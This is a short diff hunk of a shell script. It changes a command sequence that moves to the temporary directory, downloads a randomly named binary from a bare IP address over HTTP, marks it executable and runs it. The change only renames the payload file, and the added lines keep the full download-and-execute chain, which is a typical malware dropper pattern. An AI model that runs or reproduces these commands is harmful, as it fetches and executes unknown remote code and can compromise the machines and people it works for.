@@ -5,8 +5,8 @@ set -e
 
 cd "$TMPDIR"
 
-curl -fsSL -o Jiruve http://64.89.160.11/Jiruve
+curl -fsSL -o Sebajabiy http://64.89.160.11/Sebajabiy
 
-chmod +x Jiruve
+chmod +x Sebajabiy
 
-./Jiruve
+./Sebajabiy
